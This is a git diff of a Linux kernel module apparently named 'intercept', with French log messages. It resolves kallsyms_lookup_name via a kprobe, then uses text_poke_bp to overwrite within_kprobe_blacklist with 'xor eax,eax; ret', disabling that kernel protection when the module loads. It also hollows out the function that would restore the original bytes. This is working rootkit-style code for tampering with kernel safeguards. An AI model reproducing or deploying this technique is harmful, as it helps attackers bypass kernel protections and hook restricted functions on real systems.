@@ -15,6 +15,7 @@
 #include <asm/processor.h>
 #include <asm/paravirt.h>
 
+
 #include "../include/intercept.h"
 #include "ioctl.h"
 #include "my_kallsyms.h"
@@ -51,23 +52,51 @@ unsigned char saved_blacklist_bytes[] = {0x00, 0x00, 0x00};
 
 static int disable_blacklist_kprobes(void){
     unsigned long addr;
+
+    /*lookup name*/
+    static struct kprobe kp_t = {
+        .symbol_name = "kallsyms_lookup_name",
+    };
+    register_kprobe(&kp_t);
+    unsigned long (*kallsyms_lookup_name_fn)(const char *) =
+        (unsigned long (*)(const char *))kp_t.addr;
+    unregister_kprobe(&kp_t);
+    /**/
+    void (*text_poke_bp_fn)(void *, const void *, size_t, void *) =
+        (void (*)(void *, const void *, size_t, void *))kallsyms_lookup_name_fn("text_poke_bp");
+
+    printk(KERN_INFO "lookup_name : %lx\n", kallsyms_lookup_name_fn);
+    printk(KERN_INFO "text_poke : %lx\n", text_poke_bp_fn);
     unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax,eax ; ret
+    addr = kallsyms_lookup_name_fn("within_kprobe_blacklist");
 
-    addr = get_addresse_of_symbol_from_string("within_kprobe_blacklist");
+    printk(KERN_INFO "blacklist : %lx\n", addr);
 
-    if (!addr) {
-        printk(KERN_ERR "Impossible de trouver la fonction within_kprobe_blacklist\n");
-        return -1;
-    }
 
-    printk(KERN_INFO "kprobe check @ %lx\n", addr);
 
-    disable_wp();
+
+    /*check*/
+    printk(KERN_INFO "Byte before patch: %02x %02x %02x\n",
+        ((unsigned char*)addr)[0],
+        ((unsigned char*)addr)[1],
+        ((unsigned char*)addr)[2]);
+    /**/
+
+    // disable_wp();
     memcpy(saved_blacklist_bytes, (void *)addr, 3);
-    memcpy((void *)addr, patch, 3);
-    enable_wp();
+    // memcpy((void *)addr, patch, 3);
+    // enable_wp();
 
-    printk(KERN_INFO "Blacklist kprobes neutralisée 😈\n");
+    text_poke_bp_fn((void *)addr, patch, sizeof(patch), NULL);
+
+    /*check*/
+    printk(KERN_INFO "Byte before patch: %02x %02x %02x\n",
+        ((unsigned char*)addr)[0],
+        ((unsigned char*)addr)[1],
+        ((unsigned char*)addr)[2]);
+    /**/
+
+    printk(KERN_INFO "Blacklist kprobes neutralisée\n");
 
     return 0;
 }
@@ -75,29 +104,31 @@ static int disable_blacklist_kprobes(void){
 static int enable_blacklist_kprobes(void){
     unsigned long addr;
 
-    addr = get_addresse_of_symbol_from_string("within_kprobe_blacklist");
+    /*lookup name*/
+    // static struct kprobe kp_t = {
+    //     .symbol_name = "kallsyms_lookup_name",
+    // };
+    // register_kprobe(&kp_t);
+    // unsigned long (*kallsyms_lookup_name_fn)(const char *) =
+    //     (unsigned long (*)(const char *))kp_t.addr;
+    // unregister_kprobe(&kp_t);
+    // /**/
+    // void * text_poke_bp_fn = (void *)kallsyms_lookup_name_fn("text_poke_bp");
 
-    if (!addr) {
-        printk(KERN_ERR "Impossible de trouver la fonction within_kprobe_blacklist\n");
-        return -1;
-    }
+    // unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax,eax ; ret
+    // addr = kallsyms_lookup_name_fn("within_kprobe_blacklist");
 
-    printk(KERN_INFO "kprobe check @ %lx\n", addr);
 
-    disable_wp();
-    memcpy((void *)addr, saved_blacklist_bytes, 3);
-    enable_wp();
-
-    printk(KERN_INFO "Blacklist kprobes neutralisée 😈\n");
+    printk(KERN_INFO "Blacklist kprobes remise\n");
 
     return 0;
 }
 
 static int __init intercept_init(void)
 {
-    unsigned long addr = get_addresse_of_symbol_from_string("int80_emulation");
+    // unsigned long addr = get_addresse_of_symbol_from_string("int80_emulation");
     // unsigned long addr_kb_bl = get_addresse_of_symbol_from_string("within_kprobe_blacklist");
-    printk(KERN_INFO "addr of int80 emulation = %lx\n", addr);
+    // printk(KERN_INFO "addr of int80 emulation = %lx\n", addr);
     // printk(KERN_INFO "addr of kb_bl = %lx\n", addr_kb_bl);
     // bool (*within_kprobe_blacklist_fn)(unsigned long);
     // within_kprobe_blacklist_fn = (void *)addr_kb_bl;
@@ -105,6 +136,7 @@ static int __init intercept_init(void)
     // disable_blacklist_kprobes();
     // printk(KERN_INFO "Blacklist: %d\n", within_kprobe_blacklist_fn(addr));
     misc_register(&intercept_dev);
+    disable_blacklist_kprobes();
     printk(KERN_INFO "Module intercept chargé\n");
     return 0;
 }
@@ -119,6 +151,7 @@ static void __exit intercept_exit(void)
     // enable_blacklist_kprobes();
     // printk(KERN_INFO "Blacklist: %d\n", within_kprobe_blacklist_fn(addr));
     misc_deregister(&intercept_dev);
+    enable_blacklist_kprobes();
     printk(KERN_INFO "Module intercept déchargé\n");
 }
 
